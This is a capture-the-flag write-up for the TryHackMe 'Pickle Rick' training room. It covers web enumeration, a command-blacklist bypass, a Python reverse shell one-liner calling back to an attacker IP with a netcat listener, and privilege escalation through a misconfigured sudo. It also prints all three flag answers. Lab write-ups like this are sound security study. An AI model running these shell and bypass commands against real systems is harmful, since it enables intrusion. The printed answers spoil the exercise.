# 🧪 TryHackMe: Pickle Rick CTF Writeup

## 📖 Overview

This repository contains a detailed writeup of the **Pickle Rick** room on TryHackMe.

### 🎯 Objective

* Exploit a vulnerable web application
* Bypass command execution restrictions
* Gain a reverse shell
* Escalate privileges to root
* Retrieve **three secret ingredients**

---

## 🔍 1. Reconnaissance & Enumeration

### 🔹 Nmap Scan

```bash
nmap -sC -sV -oN initial <TARGET_IP>
```

**Explanation:**

* `-sC` → Default scripts (basic vuln checks)
* `-sV` → Service/version detection
* `-oN` → Save output

**Result:**

* Port 22 → SSH
* Port 80 → HTTP

---

### 🔹 Nikto Scan

```bash
nikto -h http://<TARGET_IP> -o nikto.log
```

**Purpose:**

* Detect web vulnerabilities
* Identify misconfigurations

---

### 🔹 Directory Brute-force (Gobuster)

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,sh,txt,cgi,html,js,css,py
```

**Findings:**

* `login.php`
* `robots.txt`

---

## 🌐 2. Web Exploitation

### 🔹 Credentials Discovery

* View source → Username found:

  ```
  R1ckRul3s
  ```
* `robots.txt` → Password:

  ```
  Wubba lubba dub dub
  ```

### 🔹 Login

Successfully authenticated via:

```
/login.php
```

---

### 🔹 Command Execution Panel

After login, we get a **command execution interface**.

#### List files:

```bash
ls
```

**Discovered:**

* `Sup3rS3cretPickl3Ingred.txt`
* `clue.txt`

---

### 🔹 Blacklist Bypass

Blocked commands:

```
cat, head, tail, more, nano, vim
```

#### ✅ Method 1: While Loop

```bash
while read line; do echo $line; done < clue.txt
```

#### ✅ Method 2: Grep Trick

```bash
grep . Sup3rS3cretPickl3Ingred.txt
```

🎉 **First Ingredient:**

```
mr. meeseek hair
```

---

## 🐚 3. Reverse Shell

### 🔹 Check Python

```bash
which python
which python3
```

---

### 🔹 Start Listener (Attacker Machine)

```bash
nc -lnvp 9999
```

---

### 🔹 Execute Reverse Shell

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<YOUR_IP>",9999));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'
```

📌 Result: Shell as `www-data`

---

## ⚙️ 4. Stabilizing the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
Ctrl + Z
stty raw -echo; fg
```

✅ Fully interactive shell achieved

---

## 🔐 5. Privilege Escalation

### 🔹 Check Sudo Permissions

```bash
sudo -l
```

**Result:**

```
(ALL) NOPASSWD: ALL
```

### 🔹 Escalate to Root

```bash
sudo bash
```

🎉 Root access gained instantly

---

## 🧬 6. Capturing Ingredients

### 🥈 Second Ingredient

```bash
cat "/home/rick/second ingredients"
```

**Result:**

```
1 jerry tear
```

---

### 🥉 Third Ingredient

```bash
cat /root/3rd.txt
```

**Result:**

```
fleeb juice
```

---

## ✅ Room Completed!

---

## 🧠 Key Takeaways

* Always check **source code & robots.txt**
* Blacklist bypass ≠ security
* Reverse shells are essential for stability
* Misconfigured `sudo` = instant root

---

## 🚀 Tools Used

* Nmap
* Nikto
* Gobuster
* Netcat
* Python

---

## 👨‍💻 Author

**Muhammad Taher**
Cybersecurity Enthusiast | CTF Player

---

If you want, I can also:

* 🔥 Add badges (TryHackMe, difficulty, status)
* 🎨 Make it more aesthetic (icons, shields.io)
* 📂 Convert into a full CTF portfolio repo structure
